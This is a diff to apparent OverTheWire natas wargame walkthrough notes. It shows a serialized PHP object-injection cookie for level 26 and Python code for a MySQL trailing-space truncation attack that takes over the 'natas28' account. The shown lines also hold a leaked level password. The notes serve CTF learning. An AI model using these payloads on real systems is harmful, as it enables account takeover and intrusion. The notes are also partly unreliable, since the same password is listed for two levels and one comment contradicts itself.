@@ -581,3 +581,21 @@ session.cookies['drawing'] =  ' Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmls
 // So lets make a get request to it: 
 // response = session.get(url + '/img/winner.php', auth=(username, password))
 // 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+
+lvl 27 --> lvl 28
+http://netas27.natas.labs.overthewire.org/
+natas27
+// The point of this level is to play around with SQL queries, mainly tricks to known on truncation
+// All MySQL collations are of type PADSPACE. This means that all CHAR and VARCHAR values in MySQL are compared without regard to any trailing spaces. 
+In particular, trailing spaces are significant, which is not true for CHAR or VARCHAR comparisons performed with the = operator //
+// The trick is to add a new user called 'natas28 ' with a SPACE at the end, on querying for data, SQL will give away 'natas28' and 'natas28 ' in the same manner ! What a joke ! 
+// REALLY sanitize/trim-to-valid-data/know-what-to-expect-of/dont-trust user input.
+// See the python code
+response = session.post(url, data={
+                        'username': 'natas28' + ' '*58 + 'anything', 'password': 'anything'}, auth=(username, password))
+response = session.post(url, data={
+                        'username': 'natas28', 'password': 'anything'}, auth=(username, password))
+content = response.text
+//
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
